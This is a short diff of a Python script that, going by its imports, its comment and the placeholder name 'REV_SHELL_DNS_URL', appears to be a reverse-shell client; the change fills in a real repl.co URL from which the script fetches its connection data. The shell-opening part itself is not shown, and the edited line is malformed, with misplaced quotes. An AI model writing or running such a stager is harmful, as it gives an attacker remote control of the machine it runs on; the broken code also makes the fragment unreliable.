@@ -1,7 +1,7 @@
 import json, requests, subprocess, socket
 
 #wait forever for a connection!
-DATA_URL = "REV_SHELL_DNS_URL"
+DATA_URL = https://cornsilkdishonestchapter-dns.ryderretzlaff.repl.co/get_dns/c6e5ddce-e2a7-4163-bfd1-e48ff51561d7/""
 DATA_R = requests.get(DATA_URL)
 DATA = json.loads(DATA_R)
 
